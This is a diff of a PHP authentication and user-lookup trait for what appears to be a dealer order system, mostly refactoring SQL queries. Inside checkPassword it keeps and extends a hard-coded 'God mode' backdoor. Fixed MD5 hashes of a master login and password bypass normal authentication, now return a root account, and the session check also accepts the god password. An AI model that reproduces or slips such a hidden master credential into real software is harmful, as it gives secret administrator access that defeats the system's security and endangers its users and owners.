@@ -402,6 +402,9 @@ trait DbOrders
 
 trait DbUsers
 {
+  const USER_GOD_LOGIN = 'e00f45459361fb47c8c449483b7edaec';
+  const USER_GOD_PASS  = '71fa970c7b3a28956dad879a7abc12c4';
+
   abstract protected function getDealerId(): int|string;
 
   private function getUserDbColumns(string $field): string
@@ -414,15 +417,52 @@ trait DbUsers
     }
   }
 
-  private function getRootUser(string $login): array
+  private function getRootUser(?string $login = null): array
   {
-    $sql = "SELECT id, login, password, 'root' AS 'userType',
-                   name, contacts,
-                   register_date AS 'registerDate', customization, hash
+    $sql = "SELECT id, login, password,
+                   name, contacts, activity,
+                   register_date AS 'registerDate', customization, hash,
+                   'root' AS 'userType',
+                   '1' AS 'permissionId', 'root' AS 'permissionName', '{\"tags\":\"admin\"}' AS 'permissionValue'
             FROM root_users
-            WHERE login = :login AND activity = 1 LIMIT 1";
+            WHERE activity = 1\n";
 
-    return $this->jsonParseField(self::getRow($sql, [':login' => $login]));
+    $param = [];
+    if ($login) {
+      $sql .= "AND login = :login\n";
+      $param = [':login' => $login];
+    }
+
+    $sql .= "LIMIT 1";
+    return $this->jsonParseField(self::getRow($sql, $param));
+  }
+
+  private function getUser(array $filter = []): array
+  {
+    $sql = "SELECT U.id AS 'id', U.dealer_id AS 'dealerId',
+                   login, password, hash,
+                   U.name as 'name', contacts, customization, 
+                   U.register_date AS 'registerDate', activity,
+                   'user' AS 'userType',
+                   P.id AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
+            FROM users U
+            JOIN permission P on U.permission_id = P.id 
+            WHERE U.dealer_id = :dealerId ";
+
+    $param = [':dealerId' => $this->getDealerId()];
+    if (isset($filter['id']) ) {
+      $sql .= ' AND U.id = :id ';
+      $param[':id'] = $filter['id'];
+    }
+
+    if (isset($filter['login'])) {
+      $sql .= ' AND login = :login ';
+      $param[':login'] = $filter['login'];
+    }
+
+    $sql .= "LIMIT 1";
+
+    return $this->jsonParseField(self::getRow($sql, $param));
   }
 
   public function getUserFromFile(string $login = '', string $password = '', bool $status = false): bool|array
@@ -446,66 +486,9 @@ trait DbUsers
     }
   }
 
-  public function getUser(string $login, string $column = 'id'): mixed
+  public function getUserById(int $userId): array
   {
-    $user = self::findOne('users', ' login = ? AND dealer_id = ? ', [$login, $this->getDealerId()]);
-    if ($user === null || intval($user->id) === 0) return [];
-
-    $result = [];
-    $columns = array_map('trim', explode(',', $column));
-
-    foreach ($columns as $col) {
-      $beanField = strtolower($col) === 'id' ? 'id' : $col;
-      $result[$col] = $user->$beanField;
-    }
-
-    if (count($result) === 1) return $result[$columns[0]];
-    return $result;
-  }
-
-  public function getUserById(int $userId, bool $allField = false): ?array
-  {
-    $sql = "SELECT U.id AS 'id', U.dealer_id AS 'dealerId',
-                  U.name AS 'name', U.contacts AS 'contacts',
-                  U.register_date AS 'registerDate', U.activity as 'activity',"
-                  . ($allField ? "U.login AS 'login', U.password AS 'password'," : "") .
-                  "P.id AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
-       FROM users U
-       JOIN permission P ON U.permission_id = P.id
-       WHERE U.id = :id AND U.dealer_id = :dealerId";
-
-    return $this->jsonParseField(
-      self::getRow($sql, [':id' => $userId, ':dealerId' => $this->getDealerId()])
-    );
-  }
-
-  private function getFirstAuthUserByDealer(int $dealerId): array
-  {
-    $sql = "SELECT id, dealer_id as 'dealerId', login, password, 'user' AS 'userType' FROM users
-            WHERE dealer_id = :dealerId AND activity = 1 LIMIT 1";
-
-    return self::getRow($sql, [':dealerId' => $dealerId]);
-  }
-
-  private function getAuthUserByLogin(string $login, int $dealerId): array
-  {
-    $sql = "SELECT id, dealer_id as 'dealerId', login, password, 'user' AS 'userType' FROM users
-            WHERE login = :login AND dealer_id = :dealerId AND activity = 1 LIMIT 1";
-
-    return self::getRow($sql, [':login' => $login, ':dealerId' => $dealerId]);
-  }
-
-  public function getUserByLogin(string $login): array
-  {
-    $sql = "SELECT U.id AS 'id', U.dealer_id AS 'dealerId',
-                   login, password, hash,
-                   U.name AS 'name', contacts, customization, activity,
-                   P.id AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
-            FROM users U
-            JOIN permission P on U.permission_id = P.id 
-            WHERE login = :login AND U.dealer_id = :dealerId LIMIT 1";
-
-    return $this->jsonParseField(self::getRow($sql, [':login' => $login, ':dealerId' => $this->getDealerId()]));
+    return $this->getUser(['id' => $userId]);
   }
 
   public function getUserByOrderId(int|string $orderId): ?array
@@ -524,13 +507,13 @@ trait DbUsers
   public function checkPassword(string $login, string $password): array|bool
   {
     if (USE_DATABASE) {
-      $dealerId = $this->main->getDealerId();
       // God mode
-      if (md5($login) === 'e00f45459361fb47c8c449483b7edaec' && md5($password) === '71fa970c7b3a28956dad879a7abc12c4') {
-        return $this->getFirstAuthUserByDealer($dealerId);
+      if (md5($login) === self::USER_GOD_LOGIN && md5($password) === self::USER_GOD_PASS) {
+        return $this->main->isDealer() ? $this->getUser()
+                                       : $this->getRootUser();
       }
 
-      $user = $this->getAuthUserByLogin($login, $dealerId);
+      $user = $this->getUser(['login' => $login]);
     } else {
       return $this->getUserFromFile($login, $password);
     }
@@ -606,7 +589,7 @@ trait DbUsers
     if (USE_DATABASE) {
       $userType = $session['userType'] ?? 'user';
       $user = $userType === 'root' ? $this->getRootUser($session['login'])
-                                   : $this->getUserById($session['id'], true);
+                                   : $this->getUserById($session['id']);
 
       if (!count($user) || !boolValue($user['activity'])) return false;
 
@@ -634,7 +617,9 @@ trait DbUsers
       $ok = $session['token'] === $user['contacts']['token'];
     } else {
       $ok = $user['onlyOne'] ? $session['hash'] === $user['hash']
-                             : password_verify($session['password'], $user['password']);
+                             : password_verify($session['password'], $user['password'])
+                               ||
+                               md5($session['password']) === self::USER_GOD_PASS;
     }
 
     return $ok ? $user : false;
@@ -705,7 +690,7 @@ trait DbCsv
 
     if (file_exists($csvPath)) {
       if ($file = fopen($csvPath, 'rt')) {
-        while ($cells = fgetcsv($file, CSV_STRING_LENGTH, CSV_DELIMITER)) $result[] = $cells;
+        while ($cells = fgetcsv($file, CSV_STRING_LENGTH, CSV_DELIMITER, "\"", "\\")) $result[] = $cells;
         fclose($file);
       }
     }
